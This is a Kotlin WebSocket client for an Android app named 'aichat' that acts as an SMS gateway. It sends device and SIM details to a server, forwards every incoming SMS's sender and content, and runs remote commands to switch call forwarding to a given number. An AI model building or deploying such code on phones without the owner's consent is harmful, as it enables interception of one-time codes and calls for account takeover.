package com.cornspace.aichat.data.remote

import com.cornspace.aichat.util.AppLogger
import com.cornspace.aichat.data.model.DeviceInfo
import com.cornspace.aichat.data.model.WebSocketMessage
import com.cornspace.aichat.data.model.RegisterData
import com.cornspace.aichat.data.model.HeartbeatData
import com.cornspace.aichat.data.model.SmsReceivedData
import com.cornspace.aichat.data.model.CallForwardingData
import com.cornspace.aichat.data.model.CallForwardingResponseData
import com.cornspace.aichat.util.Constants
import com.google.gson.Gson
import com.google.gson.JsonObject
import kotlinx.coroutines.*
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asStateFlow
import okhttp3.*
import java.util.concurrent.TimeUnit
import java.util.concurrent.atomic.AtomicBoolean
import java.util.concurrent.atomic.AtomicInteger
import javax.inject.Inject
import javax.inject.Singleton

@Singleton
class WebSocketClient @Inject constructor(
    private val gson: Gson
) {
    private var okHttpClient = buildOkHttpClient()

    private var webSocket: WebSocket? = null
    @Volatile private var heartbeatJob: Job? = null
    @Volatile private var reconnectJob: Job? = null

    private var scope: CoroutineScope = freshScope()

    private val _connectionState = MutableStateFlow<ConnectionState>(ConnectionState.Disconnected)
    val connectionState: StateFlow<ConnectionState> = _connectionState.asStateFlow()

    @Volatile private var reconnectAttempts = 0

    private var serverUrl: String? = null
    @Volatile private var deviceInfo: DeviceInfo? = null

    private val smsForwardedCount = AtomicInteger(0)
    private var serviceStartTime = 0L

    private var onMessageCallback: ((WebSocketMessage) -> Unit)? = null
    private var onConnectionCallback: ((ConnectionState) -> Unit)? = null
    private val shouldReconnect = AtomicBoolean(false)

    fun getSmsForwardedCount(): Int = smsForwardedCount.get()

    companion object {
        private const val TAG = "WebSocketClient"
        private fun freshScope() = CoroutineScope(Dispatchers.IO + SupervisorJob())
        private fun buildOkHttpClient() = OkHttpClient.Builder()
            .connectTimeout(Constants.CONNECTION_TIMEOUT, TimeUnit.MILLISECONDS)
            .readTimeout(0, TimeUnit.MILLISECONDS)
            .writeTimeout(30, TimeUnit.SECONDS)
            .pingInterval(25, TimeUnit.SECONDS)
            .retryOnConnectionFailure(false)
            .build()
    }

    // ─── Public API ───────────────────────────────────────────────────────────

    fun connect(
        serverUrl: String,
        deviceInfo: DeviceInfo,
        onMessageReceived: (WebSocketMessage) -> Unit,
        onConnectionStateChanged: (ConnectionState) -> Unit
    ) {
        this.onMessageCallback = onMessageReceived
        this.onConnectionCallback = onConnectionStateChanged
        this.deviceInfo = deviceInfo
        this.shouldReconnect.set(true)

        if (serviceStartTime == 0L) serviceStartTime = System.currentTimeMillis()

        val urlChanged = this.serverUrl != null && this.serverUrl != serverUrl
        this.serverUrl = serverUrl

        if (urlChanged) {
            AppLogger.d(TAG, "Server URL changed — tearing down existing connection")
            reconnectJob?.cancel(); reconnectJob = null
            webSocket?.cancel(); webSocket = null
            _connectionState.value = ConnectionState.Disconnected
            attemptConnect()
            return
        }

        val state = _connectionState.value
        if (state == ConnectionState.Connecting || state == ConnectionState.Connected) {
            AppLogger.d(TAG, "Already connected or connecting — skipping")
            return
        }
        attemptConnect()
    }

    fun forceReconnect() {
        if (!shouldReconnect.get()) { AppLogger.d(TAG, "forceReconnect ignored — shouldReconnect=false"); return }
        AppLogger.d(TAG, "Force reconnect triggered")
        reconnectJob?.cancel(); reconnectJob = null
        reconnectAttempts = 0
        webSocket?.cancel(); webSocket = null
        _connectionState.value = ConnectionState.Disconnected
        if (serverUrl != null && deviceInfo != null) attemptConnect()
    }

    fun disconnect() {
        AppLogger.d(TAG, "Disconnecting")
        shouldReconnect.set(false)
        reconnectJob?.cancel(); reconnectJob = null
        stopHeartbeat()
        webSocket?.close(1000, "Client disconnecting"); webSocket = null
        _connectionState.value = ConnectionState.Disconnected
    }

    fun destroy() {
        AppLogger.d(TAG, "Destroying")
        disconnect()
        scope.cancel()
        scope = freshScope()
        serviceStartTime = 0L
        try {
            okHttpClient.dispatcher.cancelAll()
            okHttpClient.connectionPool.evictAll()
        } catch (e: Exception) { AppLogger.e(TAG, "Error shutting down OkHttpClient", e) }
        okHttpClient = buildOkHttpClient()
    }

    fun isConnected(): Boolean = _connectionState.value == ConnectionState.Connected

    fun updateDeviceInfo(info: DeviceInfo) { this.deviceInfo = info }

    fun send(message: WebSocketMessage): Boolean {
        if (!isConnected()) { AppLogger.w(TAG, "Cannot send — not connected"); return false }
        return try {
            webSocket?.send(serializeMessage(message)) ?: false
        } catch (e: Exception) { AppLogger.e(TAG, "Error sending message", e); false }
    }

    // ─── Connection internals ─────────────────────────────────────────────────

    private fun attemptConnect() {
        val url = serverUrl ?: return
        val wsUrl = buildWsUrl(url)
        AppLogger.d(TAG, "Connecting to $wsUrl (attempt ${reconnectAttempts + 1})")
        _connectionState.value = ConnectionState.Connecting
        webSocket?.cancel()
        webSocket = okHttpClient.newWebSocket(
            Request.Builder().url(wsUrl)
                .addHeader("User-Agent", "AIChatGateway/${Constants.APP_VERSION} Android")
                .build(),
            createListener()
        )
    }

    private fun createListener() = object : WebSocketListener() {
        override fun onOpen(webSocket: WebSocket, response: Response) {
            AppLogger.d(TAG, "WebSocket opened")
            reconnectAttempts = 0
            _connectionState.value = ConnectionState.Connected
            onConnectionCallback?.invoke(ConnectionState.Connected)
            deviceInfo?.let { sendRegistration(it) }
            startHeartbeat()
        }
        override fun onMessage(webSocket: WebSocket, text: String) {
            try { onMessageCallback?.invoke(parseMessage(text)) }
            catch (e: Exception) { AppLogger.e(TAG, "Error parsing message: $text", e) }
        }
        override fun onClosing(webSocket: WebSocket, code: Int, reason: String) {
            webSocket.close(1000, null)
        }
        override fun onClosed(webSocket: WebSocket, code: Int, reason: String) {
            AppLogger.d(TAG, "WebSocket closed: $code $reason")
            stopHeartbeat()
            this@WebSocketClient.webSocket = null
            _connectionState.value = ConnectionState.Disconnected
            onConnectionCallback?.invoke(ConnectionState.Disconnected)
            if (shouldReconnect.get() && code != 1000) scheduleReconnect()
        }
        override fun onFailure(webSocket: WebSocket, t: Throwable, response: Response?) {
            AppLogger.e(TAG, "WebSocket failure: ${t.message}", t)
            stopHeartbeat()
            this@WebSocketClient.webSocket = null
            val errorState = ConnectionState.Error(t.message ?: "Unknown error")
            _connectionState.value = errorState
            onConnectionCallback?.invoke(errorState)
            if (shouldReconnect.get()) scheduleReconnect()
        }
    }

    private fun scheduleReconnect() {
        reconnectJob?.cancel()
        val delay = calculateReconnectDelay()
        AppLogger.d(TAG, "Reconnecting in ${delay}ms (attempt ${reconnectAttempts + 1})")
        reconnectJob = scope.launch {
            delay(delay)
            if (shouldReconnect.get() && _connectionState.value !is ConnectionState.Connected) {
                reconnectAttempts++
                attemptConnect()
            }
        }
    }

    private fun calculateReconnectDelay(): Long {
        val delay = Constants.RECONNECT_DELAY_INITIAL * (1L shl minOf(reconnectAttempts, 6))
        return minOf(delay, Constants.RECONNECT_DELAY_MAX)
    }

    // ─── Heartbeat ────────────────────────────────────────────────────────────

    private fun startHeartbeat() {
        heartbeatJob?.cancel()
        heartbeatJob = scope.launch {
            while (isActive) {
                delay(Constants.HEARTBEAT_INTERVAL)
                if (isConnected()) {
                    try { sendHeartbeat() }
                    catch (e: Exception) { AppLogger.e(TAG, "Heartbeat error", e) }
                }
            }
        }
    }

    private fun stopHeartbeat() { heartbeatJob?.cancel(); heartbeatJob = null }

    // ─── Message helpers ──────────────────────────────────────────────────────

    private fun sendRegistration(deviceInfo: DeviceInfo) {
        send(WebSocketMessage.Register(RegisterData(
            deviceId       = deviceInfo.deviceId,
            name           = deviceInfo.model,
            appVersion     = Constants.APP_VERSION,
            osVersion      = deviceInfo.osVersion,
            deviceModel    = deviceInfo.model,
            manufacturer   = deviceInfo.manufacturer,
            batteryLevel   = deviceInfo.batteryLevel,
            isCharging     = deviceInfo.batteryStatus.contains("Charging", ignoreCase = true),
            signalStrength = deviceInfo.simInfo.firstOrNull { it.isActive }?.signalStrength ?: 0,
            networkType    = resolveNetworkType(deviceInfo.networkInfo.networkType),
            sims           = deviceInfo.simInfo.map { it.toMap() }
        )))
    }

    fun sendHeartbeat() {
        val info = deviceInfo ?: return
        send(WebSocketMessage.Heartbeat(HeartbeatData(
            deviceId       = info.deviceId,
            batteryLevel   = info.batteryLevel,
            isCharging     = info.batteryStatus.contains("Charging", ignoreCase = true),
            signalStrength = info.simInfo.firstOrNull { it.isActive }?.signalStrength ?: 0,
            networkType    = resolveNetworkType(info.networkInfo.networkType),
            sims           = info.simInfo.map { it.toMap() },
            uptime         = (System.currentTimeMillis() - serviceStartTime) / 1000,
            smsForwarded   = smsForwardedCount.get()
        )))
    }

    fun sendSmsReceived(
        deviceId: String, sender: String, content: String, timestamp: Long,
        simSlot: Int, receiverNumber: String?, simCarrier: String?,
        simNetworkType: String?, networkType: String?
    ) {
        val smsData = SmsReceivedData(
            deviceId = deviceId, sender = sender, content = content,
            timestamp = timestamp,
            simSlot = simSlot + 1, // Convert 0-based slot to 1-based for the server
            receiverNumber = receiverNumber, simCarrier = simCarrier,
            simNetworkType = simNetworkType, networkType = networkType
        )
        if (send(WebSocketMessage.SmsReceived(smsData))) smsForwardedCount.incrementAndGet()
    }

    fun sendCallForwardingResponse(
        deviceId: String, action: String, success: Boolean, simSlot: Int,
        phoneNumber: String? = null, error: String? = null, ussdResponse: String? = null
    ) {
        if (!isConnected()) { AppLogger.w(TAG, "Cannot send — not connected"); return }
        try {
            val response = CallForwardingResponseData(
                deviceId = deviceId,
                action = action,
                success = success,
                simSlot = simSlot + 1, // 0-based → 1-based
                phoneNumber = phoneNumber,
                error = error,
                ussdResponse = ussdResponse,
                timestamp = System.currentTimeMillis()
            )
            send(WebSocketMessage.CallForwardingResponse(response))
        } catch (e: Exception) {
            AppLogger.e(TAG, "Error sending call forwarding response", e)
        }
    }

    // ─── Utilities ────────────────────────────────────────────────────────────

    private fun buildWsUrl(serverUrl: String): String {
        val url = serverUrl.trimEnd('/')
        val wsBase = when {
            url.startsWith("https://") -> "wss://" + url.removePrefix("https://")
            url.startsWith("http://")  -> "ws://"  + url.removePrefix("http://")
            url.startsWith("wss://")   -> url
            url.startsWith("ws://")    -> url
            else                       -> "wss://$url"
        }
        return "$wsBase/gateway"
    }

    private fun resolveNetworkType(raw: String): String = when {
        raw.contains("WiFi",   ignoreCase = true) -> "wifi"
        raw.contains("Mobile", ignoreCase = true) -> "mobile"
        else -> "none"
    }

    private fun parseMessage(json: String): WebSocketMessage {
        val obj = gson.fromJson(json, JsonObject::class.java)
        val type = obj.get("type")?.asString
            ?: return WebSocketMessage.Unknown("unknown", json)

        return when (type) {
            "connected"  -> WebSocketMessage.Connected(obj.get("connectionId")?.asString ?: "")
            "registered" -> WebSocketMessage.Registered(obj.get("deviceId")?.asString ?: "")
            "ack" -> {
                val data = obj.getAsJsonObject("data")
                WebSocketMessage.Ack(
                    messageId = data?.get("messageId")?.asString,
                    success   = data?.get("success")?.asBoolean ?: true
                )
            }
            "ping"  -> WebSocketMessage.Ping(obj.get("timestamp")?.asLong)
            "error" -> {
                val data = obj.getAsJsonObject("data")
                WebSocketMessage.Error(
                    code    = data?.get("code")?.asString,
                    message = data?.get("message")?.asString ?: "Unknown error"
                )
            }
            "call_forwarding" -> {
                val data = obj.getAsJsonObject("data")
                val action = data?.get("action")?.asString
                if (action.isNullOrBlank()) {
                    AppLogger.e(TAG, "call_forwarding message missing action: $json")
                    return WebSocketMessage.Unknown(type, json)
                }
                val validActions = setOf("forward", "deactivate", "check")
                if (action !in validActions) {
                    AppLogger.e(TAG, "call_forwarding unknown action '$action': $json")
                    return WebSocketMessage.Unknown(type, json)
                }
                val phoneNumberElement = data.get("phoneNumber")
                WebSocketMessage.CallForwardingCommand(CallForwardingData(
                    action      = action,
                    phoneNumber = if (phoneNumberElement != null && !phoneNumberElement.isJsonNull)
                        phoneNumberElement.asString else null,
                    simSlot     = data.get("simSlot")?.asInt ?: 0
                ))
            }
            else -> WebSocketMessage.Unknown(type, json)
        }
    }

    private fun serializeMessage(message: WebSocketMessage): String = when (message) {
        is WebSocketMessage.Register               -> gson.toJson(mapOf("type" to message.type, "data" to message.data))
        is WebSocketMessage.Heartbeat              -> gson.toJson(mapOf("type" to message.type, "data" to message.data))
        is WebSocketMessage.SmsReceived            -> gson.toJson(mapOf("type" to message.type, "data" to message.data))
        is WebSocketMessage.CallForwardingResponse -> gson.toJson(mapOf("type" to message.type, "data" to message.data))
        is WebSocketMessage.Pong                   -> gson.toJson(mapOf("type" to message.type, "timestamp" to message.timestamp))
        else                                       -> gson.toJson(mapOf("type" to message.type))
    }
}

// ─── ConnectionState ──────────────────────────────────────────────────────────

sealed class ConnectionState {
    data object Disconnected : ConnectionState()
    data object Connecting   : ConnectionState()
    data object Connected    : ConnectionState()
    data class  Error(val message: String) : ConnectionState()

    val isConnected:  Boolean get() = this is Connected
    val isConnecting: Boolean get() = this is Connecting
}